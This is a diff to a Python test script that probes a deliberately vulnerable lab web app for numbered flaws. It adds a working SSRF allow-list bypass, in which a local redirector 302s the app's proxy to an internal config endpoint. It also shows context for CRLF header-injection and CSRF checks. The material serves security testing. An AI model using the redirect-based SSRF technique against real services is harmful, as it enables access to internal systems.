@@ -41,6 +41,15 @@ _passed = 0
 _failed = 0
 
 
+def _free_port():
+    import socket
+    s = socket.socket()
+    s.bind(("127.0.0.1", 0))
+    p = s.getsockname()[1]
+    s.close()
+    return p
+
+
 def _req(base, path, method="GET", data=None, follow=True):
     """Return (status, headers, body_text). Never raises on HTTP errors."""
     url = base + path
@@ -206,6 +215,34 @@ def run(base):
     ok = any(k.lower() == "x-injected" for k in hdr)
     check("VULN-16 CRLF response-header injection (/go)", ok,
           "injected X-Injected header via %0d%0a (Set-Cookie -> session fixation)")
+
+    # VULN-04c redirect-based SSRF bypass: stand up a throwaway redirector that
+    # 302s to an internal target; the proxy follows it (a host allow-list that
+    # only checks the initial URL would be bypassed).
+    import http.server
+    import threading as _th
+    lab_internal = base + "/config/version"
+
+    class _Redir(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(302)
+            self.send_header("Location", lab_internal)
+            self.end_headers()
+
+        def log_message(self, *a):
+            pass
+
+    rport = _free_port()
+    rsrv = http.server.ThreadingHTTPServer(("127.0.0.1", rport), _Redir)
+    _th.Thread(target=rsrv.serve_forever, daemon=True).start()
+    try:
+        _, _, b = _req(base, "/proxy/multivac?url=" +
+                       urllib.parse.quote(f"http://127.0.0.1:{rport}/rec"))
+        ok = "hamivtzar-news-lab" in b
+    finally:
+        rsrv.shutdown()
+    check("VULN-04c redirect-based SSRF bypass (follows 302 to internal)", ok,
+          "external URL 302'd to internal /config/version; proxy followed it")
 
     # VULN-17 CSRF: cross-origin state-changing write accepted (no token/Origin)
     marker = "csrf-check-" + str(os.getpid())
